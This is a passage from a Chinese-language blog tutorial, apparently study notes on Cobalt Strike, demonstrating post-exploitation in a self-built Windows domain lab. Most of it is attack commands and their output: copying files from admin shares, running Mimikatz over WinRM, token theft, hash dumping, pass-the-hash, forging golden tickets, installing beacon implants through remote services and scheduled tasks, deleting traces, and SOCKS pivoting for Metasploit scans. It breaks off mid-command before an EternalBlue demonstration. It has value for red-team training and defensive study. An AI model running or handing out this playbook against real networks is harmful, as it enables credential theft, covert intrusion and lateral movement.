WinDC[+] host called home, sent: 385 bytes[+] received output:ComputerName : WinDCAccountName  : teamssix.com/AdministratorIsDomain     : TrueIsGroup      : FalseSID          : S-1-5-22-3301978333-983314215-684642015-500Description  : Disabled     : LastLogin    : 2020/8/17 22:21:23PwdLastSet   : PwdExpired   : UserFlags    : ComputerName : WinDCAccountName  : teamssix.com/Daniel……内容过多，余下部分省略……</code></pre><h2 id="3、无需恶意软件"><a href="#3、无需恶意软件" class="headerlink" title="3、无需恶意软件"></a>3、无需恶意软件</h2><p>如果一个系统信任我们为本地管理员权限，那么我们可以在那个系统上干什么呢？</p><p><strong>查看共享文件</strong></p><p>比如我们可以通过运行下面的命令来列出 C:\foo 的共享文件</p><pre><code class="powershell">shell dir \\host\C$\foo</code></pre><pre><code class="powershell">beacon&gt; shell dir \\WinDC\C$[*] Tasked beacon to run: dir \\WinDC\C$[+] host called home, sent: 55 bytes[+] received output: 驱动器 \\WinDC\C$ 中的卷没有标签。 卷的序列号是 F269-89A7 \\WinDC\C$ 的目录2020/06/24  09:29    &lt;DIR&gt;          inetpub2009/07/14  11:20    &lt;DIR&gt;          PerfLogs2020/07/16  21:24    &lt;DIR&gt;          Program Files2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)2020/07/17  23:00    &lt;DIR&gt;          Users2020/07/26  00:55    &lt;DIR&gt;          Windows               0 个文件              0 字节               6 个目录 28,500,393,984 可用字节</code></pre><p><strong>复制文件</strong></p><p>比如运行下面的命令将 <code>secrets.txt</code>文件复制到当前目录。</p><pre><code class="powershell">shell copy \\host\C$\foo\secrets.txt</code></pre><pre><code class="powershell">beacon&gt; shell copy \\WinDC\C$\foo\secrets.txt[*] Tasked beacon to run: copy \\WinDC\C$\foo\secrets.txt[+] host called home, sent: 93 bytes[+] received output:已复制         1 个文件。</code></pre><p><strong>查看文件列表</strong></p><p>比如运行下面的命令。其中 /S 表示列出指定目录及子目录所有文件，/B 表示使用空格式，即没有标题或摘要信息。</p><pre><code class="powershell">shell dir /S /B \\host\C$</code></pre><pre><code class="powershell">beacon&gt; shell dir /S /B \\WinDC\C$\Users[*] Tasked beacon to run: dir /S /B \\WinDC\C$\Users[+] host called home, sent: 67 bytes[+] received output:\\WinDC\C$\Users\administrator\\WinDC\C$\Users\Classic .NET AppPool\\WinDC\C$\Users\Daniel\\WinDC\C$\Users\Public\\WinDC\C$\Users\administrator\Contacts\\WinDC\C$\Users\administrator\Desktop\\WinDC\C$\Users\administrator\Documents\\WinDC\C$\Users\administrator\Downloads\\WinDC\C$\Users\administrator\Favorites……内容过多，余下部分省略……</code></pre><p><strong>使用 WinRM 运行命令</strong></p><p>WinRM 运行在 5985 端口上，WinRM 是 Windows 远程管服务，使用 WinRM 可以使远程管理更容易一些。</p><p>如果想利用 WinRM 运行命令则可以使用下面的命令。</p><pre><code class="powershell">powershell Invoke-Command -ComputerName TARGET -ScriptBlock &#123;command here&#125;</code></pre><pre><code class="powershell">beacon&gt; powershell Invoke-Command -ComputerName WinDC -ScriptBlock &#123; net localgroup administrators&#125;[*] Tasked beacon to run: Invoke-Command -ComputerName WinDC -ScriptBlock &#123; net localgroup administrators&#125;[+] host called home, sent: 303 bytes[+] received output:别名     administrators注释     管理员对计算机/域有不受限制的完全访问权成员-------------------------------------------------------------------------------AdministratorDomain AdminsDanielEnterprise Admins命令成功完成。</code></pre><p>注：如果命令运行失败可能是因为 WinRM 配置原因，可在 powershell 环境下运行 <code>winrm quickconfig</code>命令，输入 <code>y</code> 回车即可。</p><p>命令运行后的结果，WinRM 也将通过命令行进行显示，因此可以使用 Powershell 的 Invoke 命令来作为远程工具，而不使用其他的恶意软件来控制系统。</p><p><strong>通过 WinRM 运行 Mimikatz</strong></p><p>更进一步，甚至可以使用 PowerSploit 来通过 WinRM 运行 Mimikatz，只需要先导入 Invoke-Mimikatz.ps1 文件，再执行以下命令即可。</p><pre><code class="powershell">powershell-import /path/to/Invoke-Mimikatz.ps1powershell Invoke-Mimikatz -ComputerName TARGET</code></pre><blockquote><p>注：之前提了很多次的 PowerView 也是 PowerSploit 项目里众多 ps1 文件之一，Mimikatz 的 ps1 文件在 PowerSploit 项目的 Exfiltration 目录下，PowerSploit 项目下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p></blockquote><p>因为 beacon 上传文件大小限制在1MB，而 Invoke-Mimikatz.ps1 文件大小在 2 MB 多，因此直接运行 <code>powershell-import</code> 导入该文件会报错，这里可以选择使用 beacon 中的 upload 命令或者在当前会话的 File Browser 图形界面中上传该文件。</p><pre><code class="powershell">upload C:\path\Invoke-Mimikatz.ps1</code></pre><p>上传之后通过 dir 命令可以查看到文件被上传到了C盘下，之后可以运行以下命令来导入该文件。</p><pre><code class="powershell">powershell import-module C:\Invoke-Mimikatz.ps1</code></pre><p>最后再运行以下命令就能通过 WinRM 执行 Mimikatz 了。</p><pre><code class="powershell">powershell Invoke-Mimikatz -ComputerName TARGET</code></pre><p>如果提示<code>无法将“Invoke-Mimikatz”项识别为 cmdlet、函数……</code>，则可以将两条命令以分号合并在一起运行，即：</p><pre><code>powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET</code></pre><pre><code class="powershell">beacon&gt; powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName WinDC[*] Tasked beacon to run: import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName WinDC[+] host called home, sent: 287 bytes[+] received output:  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14 .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; ## / \ ##  /* * * ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)  &#39;#####&#39;                                     with 20 modules * * */mimikatz(powershell) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 314628 (00000000:0004cd04)Session           : Interactive from 1User Name         : administratorDomain            : TEAMSSIXLogon Server      : WinDCLogon Time        : 2020/8/20 23:53:08SID               : S-1-5-22-3301978333-983314215-684642015-500    msv :         [00000003] Primary     * Username : Administrator……内容过多，余下部分省略……</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs16-1.png"></p><p>终于把碰到的坑都填完了，睡觉……</p><h2 id="4、获取信任"><a href="#4、获取信任" class="headerlink" title="4、获取信任"></a>4、获取信任</h2><p>如果当前账号权限被系统认为是本地管理员权限，那么就可以执行很多管理员才能做的事，接下来就来看一下这样的一个过程是如何工作的，其中会涉及到以下要点：</p><p>1、<code>Access Token</code> 登录令牌</p><p>2、<code>Credentials</code> 凭证</p><p> 3、<code>Password Hashes</code> 密码哈希</p><p>4、<code>Kerberos Tickets</code> 登录凭据</p><h3 id="登录令牌"><a href="#登录令牌" class="headerlink" title="登录令牌"></a>登录令牌</h3><ul><li>登录令牌在登录之后被创建</li><li>与每个进程和线程相关联</li><li>包括：<ul><li>用户和用户组的信息</li><li>本地计算机上的特权列表</li><li>限制（删除用户和用户组的权限）</li><li>参考凭证（支持单点登录）</li></ul></li><li>一直保存在内存中，直到系统重启</li></ul><p><em>以下是令牌窃取的过程：</em></p><ul><li>使用 <code>ps</code> 列出进程</li><li>使用 <code>steal_token [pid]</code> 窃取令牌</li><li>使用 <code>getuid</code> 找到你是谁</li><li>使用 <code>rev2self</code> 移除令牌</li></ul><p>接下来将对这些命令进行演示，目前有一个 SYSTEM 权限的会话，该会话在 WIN-72A8ERDSF2P 主机下，此时想查看 WIN-P2AASSD1AF1 主机下的文件（WIN-P2AASSD1AF1 主机是 TEAMSSIX 域的域控制器），那么直接运行 dir 会提示拒绝访问。</p><pre><code class="powershell">beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$[+] host called home, sent: 55 bytes[+] received output:拒绝访问。</code></pre><p>此时，先用 <code>ps</code> 查看一下当前系统进程信息。</p><pre><code class="powershell">beacon&gt; ps[*] Tasked beacon to list processes[+] host called home, sent: 12 bytes[*] Process List PID   PPID  Name                         Arch  Session     User ---   ----  ----                         ----  -------     ----- 0     0     [System Process]                                4     0     System                       x64   0           NT AUTHORITY\SYSTEM……内容太多，此处省略…… 3720  524   taskhost.exe                 x64   2           WIN-72A8ERDSF2P\Administrator 4092  236   dwm.exe                      x64   3           TEAMSSIX\Administrator</code></pre><p>通过进程信息可以发现 TEAMSSIX 域下的管理员账户此时在当前 SYSTEM 会话的主机上是登录着的，使用 <code>steal_token [pid]</code> 命令窃取 TEAMSSIX\Administrator 账户的令牌</p><pre><code class="powershell">beacon&gt; steal_token 4092[*] Tasked beacon to steal token from PID 4092[+] host called home, sent: 12 bytes[+] Impersonated TEAMSSIX\administrator</code></pre><p>查看一下当前会话 uid</p><pre><code class="powershell">beacon&gt; getuid[*] Tasked beacon to get userid[+] host called home, sent: 8 bytes[*] You are TEAMSSIX\administrator (admin)</code></pre><p>再次尝试获取域控制器主机下的文件</p><pre><code class="powershell">beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$[+] host called home, sent: 55 bytes[+] received output: 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。 卷的序列号是 F269-89A7 \\WIN-P2AASSD1AF1\C$ 的目录2020/07/16  21:24    &lt;DIR&gt;          Program Files2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)2020/07/17  23:00    &lt;DIR&gt;          Users2020/07/26  00:55    &lt;DIR&gt;          Windows               0 个文件      0 字节               4 个目录 28,493,299,712 可用字节</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs17-1.png"></p><p>发现可以成功访问了，使用  <code>rev2self</code> 可移除当前窃取的令牌</p><pre><code class="powershell">beacon&gt; rev2self[*] Tasked beacon to revert token[+] host called home, sent: 8 bytes</code></pre><p>再次查看 uid 发现变成了原来的 SYSTEM 权限，此时 WIN-P2AASSD1AF1 主机上的文件也拒绝访问了。</p><pre><code class="powershell">beacon&gt; getuid[*] Tasked beacon to get userid[+] host called home, sent: 8 bytes[*] You are NT AUTHORITY\SYSTEM (admin)beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$[+] host called home, sent: 55 bytes[+] received output:拒绝访问。</code></pre><h3 id="凭证"><a href="#凭证" class="headerlink" title="凭证"></a>凭证</h3><p>1、使用 make_token 创建一个令牌</p><pre><code class="powershell">make_token DOMAIN\user password</code></pre><p>在运行命令之前，需要知道要获取令牌用户的密码，这里可以使用 mimikatz 进行获取，具体的方法可参考<a href="https://teamssix.com/year/200419-150600.html">《CS学习笔记 | 14、powerup提权的方法》</a>这一节中的介绍。</p><p>这里还是和上文一样的环境，在一个 SYSTEM 会话下，获取 TEAMSSIX\administrator 账号令牌，使用 mimikatz 可以得知 TEAMSSIX\administrator 账号密码为 Test111!，接下来使用 <code>make_token</code> 命令。</p><pre><code class="powershell">beacon&gt; make_token TEAMSSIX\administrator Test111![*] Tasked beacon to create a token for TEAMSSIX\administrator[+] host called home, sent: 53 bytes[+] Impersonated NT AUTHORITY\SYSTEMbeacon&gt; shell dir \\WIN-P2AASSD1AF1\C$[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$[+] host called home, sent: 55 bytes[+] received output: 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。 卷的序列号是 F269-89A7 \\WIN-P2AASSD1AF1\C$ 的目录2020/07/16  21:24    &lt;DIR&gt;          Program Files2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)2020/07/17  23:00    &lt;DIR&gt;          Users2020/07/26  00:55    &lt;DIR&gt;          Windows               0 个文件      0 字节               4 个目录 28,493,299,712 可用字节beacon&gt; powershell Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock &#123;whoami&#125;[*] Tasked beacon to run: Invoke-Command -computer WIN-P2AASSD1AF1 -ScriptBlock &#123;whoami&#125;[+] host called home, sent: 231 bytes[+] received output:teamssix\administrator</code></pre><p>当密码输入错误时，执行上面的两个命令就会提示 <code>登录失败: 未知的用户名或错误密码。</code> 同样的使用 <code>rev2self</code> 可除去当前令牌，恢复原来的 SYSTEM 权限。</p><p>2、使用 spawn beacon 替代凭证</p><pre><code class="powershell">spawnas DOMAIN\user password</code></pre><p>3、在目标上建立账户</p><pre><code class="powershell">net use \\host\C$/USER:DOMAIN\user password</code></pre><p>这两种方法，在之前的笔记中都或多或少的提及过，这里不再过多赘述。</p><h3 id="密码哈希"><a href="#密码哈希" class="headerlink" title="密码哈希"></a>密码哈希</h3><p>使用 mimikatz 获取密码哈希</p><pre><code>pth DOMAIN\user ntlmhash</code></pre><p>如何工作的？</p><p>1、mimikatz 使用登录令牌开启了一个进程，在单点登录信息那里填入我们提供的用户名称、域、密码哈希值</p><p>2、cobalt strike 自动的从那个进程中窃取令牌并关闭</p><p>首先使用 <code>hashdump</code> 获取用户的密码哈希值，这里的 beacon 会话为 SYSTEM 权限。</p><pre><code class="powershell">beacon&gt; hashdump[*] Tasked beacon to dump hashes[+] host called home, sent: 82501 bytes[+] received password hashes:Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Daniel:1000:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::TeamsSix:1002:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::</code></pre><p>使用 <code>pth</code> 获取信任</p><pre><code class="powershell">beacon&gt; pth TEAMSSIX\Administrator 12cb161bvca930994x00cbc0aczf06d1[+] host called home, sent: 23 bytes[*] Tasked beacon to run mimikatz&#39;s sekurlsa::pth /user:Administrator /domain:TEAMSSIX /ntlm:12cb161bvca930994x00cbc0aczf06d1 /run:&quot;%COMSPEC% /c echo ade660d8dce &gt; \\.\pipe\8d3e4c&quot; command[+] host called home, sent: 750600 bytes[+] host called home, sent: 71 bytes[+] Impersonated NT AUTHORITY\SYSTEM[+] received output:user    : Administratordomain    : TEAMSSIXprogram    : C:\Windows\system32\cmd.exe /c echo ade660d8dce &gt; \\.\pipe\8d3e4cimpers.    : noNTLM    : 12cb161bvca930994x00cbc0aczf06d1  |  PID  2992  |  TID  5028  |  LSA Process is now R/W  |  LUID 0 ; 14812112 (00000000:00e203d0)  \_ msv1_0   - data copy @ 0000000001794E80 : OK !  \_ kerberos - data copy @ 000000000044A188   \_ aes256_hmac       -&gt; null                \_ aes128_hmac       -&gt; null                \_ rc4_hmac_nt       OK   \_ rc4_hmac_old      OK   \_ rc4_md4           OK   \_ rc4_hmac_nt_exp   OK   \_ rc4_hmac_old_exp  OK   \_ *Password replace @ 00000000017DA1E8 (16) -&gt; nullbeacon&gt; powershell Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;[+] host called home, sent: 231 bytes[+] received output:teamssix\administrator</code></pre><h3 id="Kerberos-票据"><a href="#Kerberos-票据" class="headerlink" title="Kerberos 票据"></a>Kerberos 票据</h3><p>关于 Kerberos 的介绍可以查看知乎上的一篇文章，比较形象生动，文章地址： <a href="https://www.zhihu.com/question/22177404">https://www.zhihu.com/question/22177404</a></p><p>查看有哪些 Kerberos 票据</p><pre><code class="powershell">shell klist</code></pre><p>除去 kerberos 票据</p><pre><code class="powershell">kerberos_ticket_purge</code></pre><p>加载 kerberos 票据</p><pre><code class="powershell">kerberos_ticket_use [/path/to/file.ticket]</code></pre><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金票据 <code>Golden Ticket</code> 是 KRBTGT 帐户的 Kerberos 身份验证令牌，KRBTGT 帐户是一个特殊的隐藏帐户，用于加密 DC 的所有身份验证令牌。然后黄金票据可以使用哈希传递技术登录到任何帐户，从而使攻击者可以在网络内部不受注意地移动。</p><p><strong>使用 mimikatz 伪造黄金票据需要：</strong></p><p><strong>1、目标的用户名及域名</strong></p><p><strong>2、域的 SID 值</strong></p><p>域的 SID 值即安全标识符 <code>Security Identifiers</code>，使用 <code>whoami /user</code> 命令可查看，注意不需要 SID 最后的一组数字。</p><pre><code class="powershell">beacon&gt; shell whoami /user[*] Tasked beacon to run: whoami /user[+] host called home, sent: 43 bytes[+] received output:用户信息----------------用户名        SID                                         ============= ============================================teamssix\daniel S-1-5-21-5311978431-183514165-284342044-1000</code></pre><p>因为不需要 SID 最后一组数字，所以这里要使用的 SID 也就是 <code>S-1-5-21-5311978431-183514165-284342044</code></p><p><strong>3、DC 中  KRBTGT  用户的 NTLM 哈希</strong></p><p>DC 中  KRBTGT  用户的 NTLM 哈希可以通过 dcsync 或 hashdump 获得，下面的 hashdump 命令在域控制器的 SYSTEM 权限会话下运行。</p><pre><code class="powershell">beacon&gt; hashdump[*] Tasked beacon to dump hashes[+] host called home, sent: 82501 bytes[+] received password hashes:Administrator:500:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::Guest:501:aca3b435b5z404eeaad3f435b51404he:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aca3b435b5z404eeaad3f435b51404he:z1f8417a00az34scwb0dc15x66z43bg1:::daniel:1108:aca3b435b5z404eeaad3f435b51404he:12cb161bvca930994x00cbc0aczf06d1:::</code></pre><p>Cobalt Strike 在 <code>Access -&gt; Golden Ticket</code> 中可以打开生成黄金票据的界面。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs18-1.png"></p><p>信息填完之后，选择 Build，需要注意 Domain 需要填写成 FQDN 格式，即完全合格域名 <code>Fully Qualified Domain Name</code> ，也就是类似于 <code>teamssix.com</code> 的格式。</p><p>此时可以通过 <code>shell dir \\host\C$</code> 检查自己是否有权限，也可以使用 PowerShell 运行 whoami 查看自己是谁。</p><pre><code class="powershell">beacon&gt; powershell Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;[*] Tasked beacon to run: Invoke-Command -computer WinDC -ScriptBlock &#123;whoami&#125;[+] host called home, sent: 203 bytes[+] received output:teamssix\administrator</code></pre><h2 id="5、远程代码执行"><a href="#5、远程代码执行" class="headerlink" title="5、远程代码执行"></a>5、远程代码执行</h2><p>实现代码执行的四个步骤：</p><p>1、与目标建立信任关系</p><p>2、复制可执行文件到目标上</p><p>3、在目标上运行可执行文件</p><p>4、实现对目标的控制</p><p>以上是根据视频教程中直译的结果，个人感觉其实这一节叫<code>横向移动的方法</code>更为合适。</p><p><strong>创建可执行文件</strong></p><p>创建可执行文件可以在 Cobalt Strike 的 <code>Attack -&gt; Packages -&gt; Windows Executable(s)</code> 处进行创建。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-1.png"></p><p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。</p><p><strong>上传可执行文件</strong></p><p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p><pre><code class="powershell">shell copy file.exe \\host\C$\Windows\Temp</code></pre><pre><code class="powershell">beacon&gt; upload /root/beacon.exe[*] Tasked beacon to upload /root/Desktop/beacon.exe as beacon.exe[+] host called home, sent: 289302 bytesbeacon&gt; shell copy beacon.exe \\WinTest\C$\Windows\Temp[*] Tasked beacon to run: copy beacon.exe \\WinTest\C$\Windows\Temp[+] host called home, sent: 72 bytes[+] received output:已复制         1 个文件。</code></pre><p><strong>执行文件（方法一）</strong></p><p>1、生成 Windows Service EXE 并上传</p><p>2、在目标主机上创建一个服务</p><pre><code class="powershell">shell sc \\host create name binpath= c:\windows\temp\file.exe</code></pre><pre><code class="powershell">beacon&gt; shell sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe[*] Tasked beacon to run: sc \\wintest create beacon binpath= c:\windows\temp\beacon.exe[+] host called home, sent: 93 bytes[+] received output:[SC] CreateService 成功</code></pre><blockquote><p>注：记住 binpath 路径</p></blockquote><p>3、在目标主机上启动服务</p><pre><code class="powershell">shell sc \\host start name</code></pre><pre><code class="powershell">beacon&gt; shell sc \\wintest start beacon[*] Tasked beacon to run: sc \\wintest start beacon[+] host called home, sent: 56 bytes[+] received output:SERVICE_NAME: beacon         TYPE               : 10  WIN32_OWN_PROCESS          STATE              : 2  START_PENDING                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x7d0        PID                : 3816        FLAGS              : beacon&gt; link wintest[*] Tasked to link to \\wintest\pipe\msagent_da00[+] host called home, sent: 36 bytes[+] established link to child beacon: 192.168.175.130</code></pre><p>4、清除痕迹与服务</p><pre><code>shell sc \\host delete name</code></pre><pre><code class="powershell">beacon&gt; shell del beacon.exe[*] Tasked beacon to run: del beacon.exe[+] host called home, sent: 57 bytesbeacon&gt; shell del \\wintest\C$\windows\temp\beacon.exe[*] Tasked beacon to run: del \\wintest\C$\windows\temp\beacon.exe[+] host called home, sent: 83 bytesbeacon&gt; shell sc \\wintest delete beacon[*] Tasked beacon to run: sc \\wintest delete beacon[+] host called home, sent: 69 bytes[+] received output:[SC] DeleteService 成功</code></pre><p><strong>执行文件（方法二）</strong></p><p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code> Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p><p>2、找到目标系统上的时间</p><pre><code class="powershell">shell net time \\host</code></pre><pre><code class="powershell">beacon&gt; shell net time \\windc[*] Tasked beacon to run: net time \\windc[+] host called home, sent: 49 bytes[+] received output:\\windc 的当前时间是 2020/8/30 14:54:09命令成功完成。</code></pre><p>3、创建一个计划任务</p><pre><code class="powershell">shell at \\host HH:mm C:\path\to\bad.exe</code></pre><pre><code class="powershell">beacon&gt; shell at \\windc 15:00 C:\windows\temp\beacon.exe[*] Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon.exe[+] host called home, sent: 76 bytes[+] received output:新加了一项作业，其作业 ID = 1</code></pre><p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p><pre><code class="powershell">beacon&gt; link windc[*] Tasked to link to \\windc\pipe\msagent_d76a[+] host called home, sent: 34 bytes[+] established link to child beacon: 192.168.175.144</code></pre><p><strong>beacon 的自动操作</strong></p><p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p><ul><li>使用一个服务运行可执行文件</li></ul><pre><code class="powershell">psexec [target] [share] [listener]</code></pre><ul><li>使用一个服务运行 Powershell 单行程序</li></ul><pre><code class="powershell">psexec_psh [target] [listener]</code></pre><ul><li>通过 WinRM 运行 Powershell 单行程序</li></ul><pre><code class="powershell">winrm [target] [listener]</code></pre><ul><li>通过 WMI 运行 Powershell 单行程序</li></ul><pre><code class="powershell">wmi [target] [listener]</code></pre><p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 也可以通过图形化的方式进行上述操作，这样也使得横向移动更加的简单。</p><p>接下来进行一下演示，目前手中有一个普通机器的管理员会话，我们先在这台机器上运行 <code>net view</code> 查看一下当前域环境中的主机信息。</p><pre><code class="powershell">beacon&gt; net view[*] Tasked beacon to run net view[+] host called home, sent: 104504 bytes[+] received output:List of hosts:[+] received output: Server Name             IP Address                       Platform  Version  Type   Comment -----------             ----------                       --------  -------  ----   -------             WINDC                   192.168.175.144                  500       6.1      PDC     WINTEST                 192.168.175.130                  500       6.1         </code></pre><p>因为是自己本地搭建的测试环境，所以主机很少，可以看到当前域中有两台机器，再利用 PowerView 查找一下具有本地管理员访问权限的用户</p><pre><code class="powershell">beacon&gt; powershell-import PowerView.ps1[*] Tasked beacon to import: PowerView.ps1[+] host called home, sent: 101224 bytesbeacon&gt; powershell Find-LocalAdminAccess[*] Tasked beacon to run: Find-LocalAdminAccess[+] host called home, sent: 329 bytes[+] received output:WinDC.teamssix.com</code></pre><p>接下来在 WinDC 上运行 psexec，因为这里是 64 位的，所以选择 psexec64，之后监听选择一个 smb beacon，会话就选择已经上线的 wintest 主机的会话，并勾选使用当前会话的访问令牌。</p><p>这里笔者认为应该是因为当前在 wintest 主机上有 windc 的管理员账户登录着，所以使用 wintest 的访问令牌是可以获取 windc 的信任的，类似于 <a href="https://teamssix.com/year/200419-150622.html">CS 学习笔记 17 节</a>里的描述方法，如有不正确之处，还请多多指教。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-2.png"></p><p>之后，windc 主机就上线了，域中如果还有其他主机，也可以使用这种方法去横向移动。</p><h1 id="0x07-转发"><a href="#0x07-转发" class="headerlink" title="0x07 转发"></a>0x07 转发</h1><h2 id="1、SOCKS-代理转发"><a href="#1、SOCKS-代理转发" class="headerlink" title="1、SOCKS 代理转发"></a>1、SOCKS 代理转发</h2><p>在进行转发操作之前，需要将当前会话改为交互模式，也就是说输入命令就被执行，执行 <code>sleep 0</code> 即为交互模式。</p><h3 id="Socks"><a href="#Socks" class="headerlink" title="Socks"></a>Socks</h3><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs20-1.png"></p><ul><li><p>在当前 beacon 上可以右击选择 <code>Pivoting --&gt; SOCKS Server</code> 设置一个 Socks4a 代理服务</p></li><li><p>或者使用命令 <code>socks [port]</code> 进行设置</p></li><li><p>使用命令 <code>socks stop</code> 关闭 Socks 代理服务</p></li><li><p>在 <code>View --&gt; Proxy Pivots</code> 中可以看到已经创建的代理服务</p></li></ul><h3 id="Metasploit-连接到-Socks-代理服务"><a href="#Metasploit-连接到-Socks-代理服务" class="headerlink" title="Metasploit 连接到 Socks 代理服务"></a>Metasploit 连接到 Socks 代理服务</h3><ul><li>CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信</li></ul><pre><code>setg Proxies socks4:127.0.0.1:[port]setg ReverseAllowProxy true</code></pre><p>如果感觉上面命令比较长，还可以在 <code>Proxy Pivots</code> 界面中点击 <code>Tunnel</code> 按钮查看命令。</p><ul><li>运行以下命令来停止</li></ul><pre><code>unsetg Proxies</code></pre><p>setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。</p><p><strong>演示</strong></p><p>1、环境说明</p><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0/24 地址段</p></blockquote><p>当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0/24 地址段内。</p><p>但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式。</p><p>2、设置 socks 代理</p><p>开启交互模式</p><pre><code>sleep 0</code></pre><pre><code class="powershell">beacon&gt; sleep 0[*] Tasked beacon to become interactive[+] host called home, sent: 16 bytes</code></pre><p>开启 socks 代理</p><pre><code>socks 9527</code></pre><pre><code class="powershell">beacon&gt; socks 9527[+] started SOCKS4a server on: 9527[+] host called home, sent: 16 bytes</code></pre><p>以上操作也可以通过图形化的方式进行。</p><p>3、Metasploit 中进行设置</p><p>开启 Metasploit 后，运行 setg 命令</p><pre><code>setg Proxies socks4:192.168.175.200:9527</code></pre><pre><code class="powershell">msf5 &gt; setg Proxies socks4:192.168.175.200:9527Proxies =&gt; socks4:192.168.175.200:9527</code></pre><p>4、扫描 192.168.232.0/24 地址段中的 445 端口</p><p>这里作为演示，只扫描一下 445 端口</p><pre><code>use auxiliary/scanner/smb/smb_versionset rhost 192.168.232.0/24set threads 64exploit</code></pre><pre><code class="powershell">msf5 &gt; use auxiliary/scanner/smb/smb_version msf5 auxiliary(scanner/smb/smb_version) &gt; set rhost 192.168.232.0/24 rhost =&gt; 192.168.232.0/24msf5 auxiliary(scanner/smb/smb_version) &gt; set threads 64threads =&gt; 64msf5 auxiliary(scanner/smb/smb_version) &gt; exploit use auxiliary/scanner/smb/smb_version[*] 192.168.232.0/24:445  - Scanned  44 of 256 hosts (17% complete)[*] 192.168.232.0/24:445  - Scanned  64 of 256 hosts (25% complete)[*] 192.168.232.0/24:445  - Scanned 110 of 256 hosts (42% complete)[*] 192.168.232.0/24:445  - Scanned 111 of 256 hosts (43% complete)[*] 192.168.232.0/24:445  - Scanned 128 of 256 hosts (50% complete)[+] 192.168.232.133:445   - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional)[+] 192.168.232.132:445   - Host is running Windows 2008 HPC SP1 (build:7601) (name:WINDC) (domain:TEAMSSIX) (signatures:required)[*] 192.168.232.0/24:445  - Scanned 165 of 256 hosts (64% complete)[*] 192.168.232.0/24:445  - Scanned 184 of 256 hosts (71% complete)[*] 192.168.232.0/24:445  - Scanned 220 of 256 hosts (85% complete)[*] 192.168.232.0/24:445  - Scanned 249 of 256 hosts (97% complete)[*] 192.168.232.0/24:445  - Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>5、发现利用</p><p>通过扫描发现在 192.168.232.0/24 地址段内，除了已经上线的 <code>133</code> 主机外，还有 <code>132</code> 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。</p><pre><code>use 